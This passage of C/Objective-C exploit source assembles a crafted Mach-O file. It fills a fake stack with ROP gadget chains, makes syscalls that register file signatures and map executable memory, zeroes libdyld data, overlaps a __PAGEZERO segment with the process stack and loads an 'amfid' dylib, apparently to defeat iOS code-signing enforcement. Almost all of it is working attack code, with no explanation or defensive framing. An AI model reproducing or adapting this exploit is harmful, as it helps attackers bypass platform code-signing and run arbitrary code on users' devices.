  uint64_t argv0;
  uint64_t argv1;
  uint64_t envp0;
  uint64_t nx_exec;
};
*/
/*
// DARK MAGIC!
for (int i = 0; i < 0x100; i++) {

stack = &stackbase[i * 0x100/8];
Set19_20_21_22_23_24_25_26_27_28((((uint64_t)(0x100 - i - 5) << 12)+0x1000040b0),0x41414141414141,0,0,0,0,0,0,0,0);
stack_tmp = stack;
*stack++ = 0x4141414141414141;
*stack++ = str_x20_x19_ldr_x29x30x20x19x22x21;
*stack++ = 0x4141414241414141;
*stack++ = 0x4141414341414141;
*stack++ = 0x4141414441414141;
*stack++ = 0x4141414541414141;
*stack++ = 0x4141414641414141;
*stack++ = 0x150001000;
*stack_tmp = segstack;
*stack++ = 0x100000000 | (uint64_t)(0x100 - i - 5) << 12;
*stack++ = 1;
*stack++ = SEG_VAR(path[0]);
*stack++ = 0;
*stack++ = 0;
*stack++ = SEG_VAR(path[0]);
*stack++ = 0; //SEG_VAR(path);
}*/


// Even More Dark Magic

[dy setSlide:0x150000000-0x120000000];

DoSyscall(SYS_open, SEG_VAR(path), O_RDONLY, 0, 0,0,0,0);
WriteR0(SEG_VAR(amfi_fd));

//Set8(0x4848484848484848);

argss->sig.fs_file_start = 0;
argss->sig.fs_blob_start = (void *)37120;
argss->sig.fs_blob_size = 336;

{
  uint64_t* tmpz = 0;
  LoadR0(SEG_VAR(amfi_fd));
  WriteR0(0x13414141414;tmpz=stack);
  FuncCall4([dy solveSymbol:@"_syscall"], SYS_fcntl, 0, 0, 0);
  *tmpz = segstack;
  *stack++ = 0;
  *stack++ = F_ADDFILESIGS;
  *stack++ = SEG_VAR(sig);
  *stack++ = 0;
  *stack_tmp = segstack;
  WriteR0(SEG_VAR(retv));

}

{
  uint64_t* tmpz = 0;
  LoadR0(SEG_VAR(amfi_fd));
  WriteR0(0x13414141414;tmpz=stack);
  uint64_t* tmpy = 0;
  LoadR0(SEG_VAR(retv));
  WriteR0(0x13414141414;tmpy=stack);
  FuncCall4([dy solveSymbol:@"_fprintf"], 0, SEG_VAR(msg), 0, 0);
  *tmpz = segstack;
  *stack++ = 0x1337111122223333;
  *tmpy = segstack;
  *stack++ = 0x1337111122224444;
  *stack_tmp = segstack;
}



{
  uint64_t* tmpz = 0;
  LoadR0(SEG_VAR(amfi_fd));
  WriteR0(0x13414141414;tmpz=stack);
  FuncCall4([dy solveSymbol:@"_syscall"], SYS_mmap, 0, 0, 0);
  *stack++ = 0x14FF00000;
  *stack++ = 0x4000;
  *stack++ = PROT_READ|PROT_EXEC;
  *stack++ = MAP_PRIVATE|MAP_FIXED;
  *tmpz = segstack;
  *stack++ = 0;
  *stack++ = 0;
  *stack_tmp = segstack;
}


{
  uint64_t* tmpz = 0;
  LoadR0(SEG_VAR(amfi_fd));
  WriteR0(0x13414141414;tmpz=stack);
  FuncCall4([dy solveSymbol:@"_syscall"], SYS_mmap, 0, 0, 0);
  *stack++ = 0x14FF04000;
  *stack++ = 0x8000;
  *stack++ = PROT_READ|PROT_WRITE;
  *stack++ = MAP_PRIVATE|MAP_FIXED;
  *tmpz = segstack;
  *stack++ = 0;
  *stack++ = 0x4000;
  *stack_tmp = segstack;
}


DoSyscall(294, SEG_VAR(shared_cache_base), 0, 0, 0,0,0,0);

LoadR0(SEG_VAR(shared_cache_base));
AddR0(0x16c85008);
WriteR0(SEG_VAR(zero_this));


/*
{
uint64_t* tmpy = 0;
LoadR0(SEG_VAR(zero_this));
WriteR0(0x13414141414;tmpy=stack;);
FuncCall4(0x13414141414;*tmpy=segstack;,SEG_VAR(dys),SEG_VAR(zero_this),0,0);
*stack_tmp = segstack;
}*/


LoadR0(SEG_VAR(shared_cache_base));
AddR0(_LDYLD_BSS - _DYCACHE_BASE); // pointer to libdyld BSS
WriteR0(SEG_VAR(zero_this));

for (int i=0; i < 0xF0; i+=8)
{
  uint64_t* tmpy = 0;
  LoadR0(SEG_VAR(zero_this));
  AddR0(i);
  WriteR0(0x13414141414;tmpy=stack;);
  WriteWhatWhere(0, 0x13414141414;*tmpy = segstack);
  *stack_tmp = segstack;

}



{
  uint64_t* tmpz = 0;
  LoadR0(SEG_VAR(zero_this));
  WriteR0(0x13414141414;tmpz=stack);
  uint64_t* tmpy = 0;
  LoadR0(SEG_VAR(shared_cache_base));
  WriteR0(0x13414141414;tmpy=stack);
  FuncCall4([dy solveSymbol:@"_fprintf"], 0, SEG_VAR(msg), 0, 0);
  *tmpz = segstack;
  *stack++ = 0x1337111122223333;
  *tmpy = segstack;
  *stack++ = 0x1337111122224444;
  *stack_tmp = segstack;
}

// enter dyld
{/*
  uint64_t* tmpy = 0;
  LoadR0(SEG_VAR(zero_this));
  WriteR0(0x13414141414;tmpy=stack;);
  */
  Set19_20_21_22_23_24_25_26_27_28(0x14FF00000+0x0000040b0,mov_x0_0_ret-0x4ff00000,0,0,0,0,0,0,0,0);
  stack_tmp = stack;
  *stack++ = 0x4141414141414141;
  *stack++ = str_x20_x19_ldr_x29x30x20x19x22x21;
  *stack++ = 0x4141414241414141;
  *stack++ = 0x4141414341414141;
  *stack++ = 0x4141414441414141;
  *stack++ = 0x4141414541414141;
  *stack++ = 0x4141414641414141;
  *stack++ = 0x150001000;
  *stack_tmp = segstack;
  *stack++ = 0x14FF00000;
  *stack++ = 1;
  *stack++ = SEG_VAR(path[0]);
  *stack++ = 0;
  *stack++ = 0;
  *stack++ = SEG_VAR(path[0]);
  *stack++ = 0; //SEG_VAR(path);
}

DoSyscall(SYS_exit, 42, 0, 0, 0,0,0,0);


fsz += load_cmd_seg.filesize;

load_cmd_seg.vmaddr = 0x152000000;
load_cmd_seg.fileoff = fsz;
load_cmd_seg.filesize = round_page(sizeof(args_t)) + 0x3000;
load_cmd_seg.vmsize = round_page(sizeof(args_t)) + 0x3000;
strcpy(&load_cmd_seg.segname[0], "__ROPDATA");
memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
mh.sizeofcmds += load_cmd_seg.cmdsize;
mh.ncmds++;
memcpy(buf + fsz, argss, sizeof(args_t));
fsz += load_cmd_seg.filesize;

/* segment overlap over the stack */

load_cmd_seg.vmaddr = 0x16fd00000; // overlap with stack
load_cmd_seg.fileoff = fsz;
load_cmd_seg.filesize = 0x400000;
load_cmd_seg.vmsize = 0x400000;
strcpy(&load_cmd_seg.segname[0], "__PAGEZERO"); // must be __PAGEZERO
memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
mh.sizeofcmds += load_cmd_seg.cmdsize;
mh.ncmds++;
stack = (uint64*)(buf + fsz);

for (int n = 0; n < 0x400; n++) {
  for (int i = 0; i < 0x1000/8;) {
    stack[(n*0x1000/8) + (i)] = (uint64_t)&stack[(n*0x1000/8) + (i+2)]; // LR
    i++;
    stack[(n*0x1000/8) + (i)] = mov_sp_x29_pop_x29_x30_ret + 4; // PC
    i++;
  }
  int i = (0x1000/8)-2;
  stack[(n*0x1000/8) + (i)] = ((uint64_t)segstackbase) /*+ (n*0x100)*/; // LR
  i++;
  stack[(n*0x1000/8) + (i)] = mov_sp_x29_pop_x29_x30_ret; // LR
  i++;
}
fsz += load_cmd_seg.filesize;


load_cmd_seg.initprot = PROT_READ;
load_cmd_seg.maxprot = PROT_READ;
load_cmd_seg.fileoff = fsz;
load_cmd_seg.vmsize = 0x1000;
load_cmd_seg.vmaddr = 0x159F00000;
load_cmd_seg.filesize = 0x1000;
strcpy(&load_cmd_seg.segname[0], "__LINKEDIT");
memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
mh.sizeofcmds += load_cmd_seg.cmdsize;
mh.ncmds++;
fsz += load_cmd_seg.filesize;


struct linkedit_data_command cs_cmd;

cs_cmd.cmd = LC_CODE_SIGNATURE;
cs_cmd.cmdsize = 16;
cs_cmd.dataoff = fsz;
cs_cmd.datasize = g_cs_size;

memcpy(buf + mh.sizeofcmds + sizeof(mh), &cs_cmd, cs_cmd.cmdsize);
mh.sizeofcmds += cs_cmd.cmdsize;
mh.ncmds++;

char *cs_data = (char*)(buf + fsz);
memcpy(cs_data, g_cs_ptr, g_cs_size);
fsz += cs_cmd.datasize;

struct dylib_command dy_cmd;

dy_cmd.cmd = LC_LOAD_DYLIB;
dy_cmd.cmdsize = sizeof(struct dylib_command) + strlen("magic64_amfid.dylib") + 0x10;
dy_cmd.dylib.name.offset = sizeof(struct dylib_command);
dy_cmd.dylib.timestamp = 0;
dy_cmd.dylib.current_version = 0x50505050;
dy_cmd.dylib.compatibility_version = 0;

memcpy(buf + mh.sizeofcmds + sizeof(mh), &dy_cmd, dy_cmd.cmdsize);
strcpy(buf + mh.sizeofcmds + sizeof(mh) + sizeof(struct dylib_command), "magic64_amfid.dylib");
mh.sizeofcmds += dy_cmd.cmdsize;
mh.ncmds++;


memcpy(buf + mh.sizeofcmds + sizeof(mh), g_dy_ptr, g_dy_ptr->cmdsize);
mh.sizeofcmds += g_dy_ptr->cmdsize;
mh.ncmds++;

memcpy(buf, &mh, sizeof(mh));
ftruncate(fd,fsz);
return 0;
}
